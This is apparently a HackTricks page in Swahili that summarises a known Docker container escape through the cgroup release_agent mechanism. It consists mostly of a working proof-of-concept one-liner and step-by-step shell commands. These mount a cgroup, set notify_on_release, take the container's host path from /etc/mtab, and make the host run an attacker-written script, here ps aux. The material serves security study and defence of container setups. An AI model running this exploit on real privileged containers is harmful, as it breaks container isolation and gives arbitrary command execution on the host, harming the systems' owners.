# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Kwa maelezo zaidi, rejelea** [**blogu ya asili**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Hii ni muhtasari tu:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Uthibitisho wa dhana (PoC) unaonyesha njia ya kutumia cgroups kwa kuunda faili ya `release_agent` na kuanzisha kuitwa kwake ili kutekeleza amri zisizo na mipaka kwenye mwenyeji wa kontena. Hapa kuna muhtasari wa hatua zinazohusika:

1. **Andaa Mazingira:**
- Kadiria `/tmp/cgrp` inaundwa ili kutumikia kama sehemu ya kuunganisha kwa cgroup.
- Kidhibiti cha cgroup cha RDMA kinaunganishwa kwenye hii directory. Katika kesi ya kutokuwepo kwa kidhibiti cha RDMA, inapendekezwa kutumia kidhibiti cha cgroup cha `memory` kama mbadala.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Weka Cgroup ya Mtoto:**
- Cgroup ya mtoto inayoitwa "x" inaundwa ndani ya saraka ya cgroup iliyowekwa.
- Arifa zinawekwa kuwa active kwa cgroup "x" kwa kuandika 1 kwenye faili yake ya notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Sanidi Wakala wa Kutolewa:**
- Njia ya kontena kwenye mwenyeji inapatikana kutoka kwa faili ya /etc/mtab.
- Faili ya release_agent ya cgroup kisha inasanidiwa ili kutekeleza skripti inayoitwa /cmd iliyoko kwenye njia ya mwenyeji iliyopatikana.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Unda na Sanidi Skripti ya /cmd:**
- Skripti ya /cmd inaundwa ndani ya kontena na inasanidiwa kutekeleza ps aux, ikielekeza matokeo kwenye faili lililo na jina /output ndani ya kontena. Njia kamili ya /output kwenye mwenyeji imeainishwa.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Chochea Shambulio:**
- Mchakato unaanzishwa ndani ya cgroup ya mtoto "x" na mara moja unakatishwa.
- Hii inachochea `release_agent` (script ya /cmd), ambayo inatekeleza ps aux kwenye mwenyeji na kuandika matokeo kwenye /output ndani ya kontena.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
